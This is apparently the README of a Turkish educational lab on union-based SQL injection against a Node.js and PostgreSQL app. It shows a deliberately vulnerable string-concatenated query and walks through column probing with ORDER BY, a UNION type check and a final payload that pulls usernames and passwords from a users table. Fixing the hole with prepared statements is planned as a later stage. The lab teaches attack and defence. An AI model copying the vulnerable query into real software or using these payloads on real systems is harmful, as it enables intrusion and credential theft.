Ethical Hacking Projesi: SQL Injection Laboratuvarı
Bu proje, modern web uygulamalarında sıkça karşılaşılan SQL Injection (SQLi) zafiyetinin anatomisini anlamak, sömürmek ve sonrasında güvenli hale getirmek amacıyla geliştirilmiş bir eğitim laboratuvarıdır.

🚀 Proje Hakkında
Bu laboratuvarda, kullanıcı girdilerini güvenli olmayan bir şekilde işleyen bir Node.js & PostgreSQL ortamı simüle edilmiştir. Odak noktamız, saldırganın veri tabanındaki gizli tablolara erişmesini sağlayan Union-Based SQL Injection tekniğidir.

Teknik Yığın (Tech Stack)
Backend: Node.js, Express.js

Veritabanı: PostgreSQL

Kütüphane: pg (PostgreSQL client for Node.js)

Frontend: Vanilla JS & CSS

🛠️ Kurulum
1. Veritabanı Hazırlığı
PostgreSQL üzerinde sql-injection adında bir veritabanı oluşturun ve aşağıdaki tabloları tanımlayın:

SQL
-- Ürünler tablosu (Halka açık veri)
CREATE TABLE products (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    description TEXT,
    price INT
);

-- Kullanıcılar tablosu (Gizli/Kritik veri)
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(100),
    role VARCHAR(20)
);

-- Test verilerini ekleyin (Ürünler ve Gizli Kullanıcılar)
INSERT INTO products (name, description, price) VALUES ('iPhone 15', '256GB Siyah', 60000);
INSERT INTO users (username, password, role) VALUES ('admin', 'SuperGizliSifre2024!', 'administrator');
2. Uygulamanın Çalıştırılması
Bağımlılıkları yükleyin ve sunucuyu başlatın:

Bash
npm install express pg
node app.js
🔍 Zafiyet Analizi: Neden Savunmasız?
Uygulamanın /search endpoint'i, kullanıcıdan gelen q parametresini doğrudan SQL sorgusuna ekler (string concatenation).

Zafiyetli Kod Bloğu:

JavaScript
const query = `SELECT name, description, price FROM products WHERE name = '${searchTerm}'`;
Bu yaklaşım, saldırganın ' (tek tırnak) karakteri ile mevcut sorguyu kapatıp kendi SQL komutlarını enjekte etmesine olanak tanır.

⚔️ Saldırı Senaryosu (Exploitation)
Laboratuvar ortamında Union-Based saldırı gerçekleştirmek için aşağıdaki adımlar izlenmiştir:

Adım 1: Sütun Sayısının Keşfi
Arka plandaki sorgunun kaç sütun döndürdüğünü bulmak için ORDER BY kullanılır.

iPhone' ORDER BY 3 -- (Başarılı)

iPhone' ORDER BY 4 -- (Hata! -> Demek ki 3 sütun var.)

Adım 2: Veri Tiplerinin Uyumluluğu
Hangi sütunların metin tabanlı olduğunu anlamak için:

' UNION SELECT 'test1', 'test2', 1 --

Adım 3: Kritik Veri Sızıntısı (Kill Shot)
products tablosu üzerinden users tablosundaki gizli verileri çekmek için hazırlanan payload:

SQL
' UNION SELECT username, password, id FROM users --
🛡️ Gelecek Adımlar: Savunma
Projenin bir sonraki aşamasında, bu zafiyet "Parametreli Sorgular" (Prepared Statements) kullanılarak kapatılacaktır.

Not: Bu proje tamamen eğitim amaçlıdır. Sadece izinli ortamlarda test edilmelidir.
